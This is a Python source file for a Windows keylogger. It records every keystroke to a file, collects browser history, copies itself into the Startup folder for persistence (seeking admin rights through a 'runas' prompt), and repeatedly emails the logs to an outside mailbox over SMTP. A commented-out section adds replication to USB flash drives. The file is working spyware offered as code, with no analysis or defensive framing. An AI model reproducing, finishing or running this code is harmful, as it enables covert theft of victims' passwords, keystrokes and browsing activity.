import ctypes
import os
import shutil
import smtplib
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
# import psutil
from browser_history import get_history
from pynput import keyboard

'''
Replication functions that are unable to be currently tested
////////////////////////////////////////////////////////////
def get_flash_drives():
    flash_drives = []

    for partition in psutil.disk_partitions():
        drive_letter = partition.device[:2]
        drive_type = psutil.os.windows.partition_type(drive_letter)

        # Check if the drive is a removable drive (common for flash drives)
        if psutil.os.windows.DRIVE_REMOVABLE == drive_type:
            flash_drives.append(partition.mountpoint)

    return flash_drives


def copy_to_flash_drives(flash_drives):
    for drive in flash_drives:
        destination_path = os.path.join(drive, "copied_script.py")

        try:
            shutil.copy(os.path.join(os.getcwd(), "cat.exe"), destination_path)
        except Exception as e:
            print(f"Error copying script to {destination_path}: {e}")
'''


def find_exe():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    exe_file_path = os.path.join(startup_folder, "cat.exe")
    return os.path.isfile(exe_file_path)


def add_to_startup_windows():
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    try:
        shutil.copy(script_path, startup_folder)
    except PermissionError:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


def send_email(subject, body, to_email, attachment_path, attachment_path2, smtp_server, smtp_port, sender_email):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    for attachment_path in [attachment_path, attachment_path2]:
        if attachment_path:
            with open(attachment_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
                msg.attach(part)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(sender_email, "example")

        server.sendmail(sender_email, to_email, msg.as_string())


def key_pressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            if key == key.backspace:
                logKey.write("\b")

            elif key == key.space:
                logKey.write(" ")


def main():
    subject = "Keys"
    attachment_path = os.path.join(os.getcwd(), "keyfile.txt")
    attachment_path2 = os.path.join(os.getcwd(), "history.json")
    body = "Hello, this is a test email from tutanota.com"
    to_email = "example@tuta.com"
    smtp_server = "smtp.tutanota.com"
    smtp_port = 587
    sender_email = "example@tuta.com"

    exe_exists = find_exe()
    if not exe_exists:
        add_to_startup_windows()
    # flash_drives = get_flash_drives()
    # copy_to_flash_drives(flash_drives)
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    time.sleep(120)

    while True:
        outputs = get_history()
        outputs.save("history.json")
        time.sleep(20)
        send_email(subject, body, to_email, attachment_path, attachment_path2, smtp_server, smtp_port, sender_email)


if __name__ == "__main__":
    main()
